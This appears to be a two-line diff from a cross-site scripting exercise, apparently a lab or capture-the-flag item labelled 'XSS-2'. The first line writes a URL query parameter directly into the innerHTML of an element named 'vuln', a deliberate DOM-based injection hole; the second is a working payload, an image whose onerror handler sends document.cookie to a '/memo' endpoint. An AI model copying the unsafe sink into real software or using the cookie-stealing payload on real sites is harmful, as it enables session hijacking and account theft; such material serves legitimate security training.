@@ -1,0 +1,2 @@
+<script>var x=new URLSearchParams(location.search); document.getElementById('vuln').innerHTML = x.get('param');</script>
+<img src="XSS-2" onerror="location.href='/memo?memo='+document.cookie"></img>
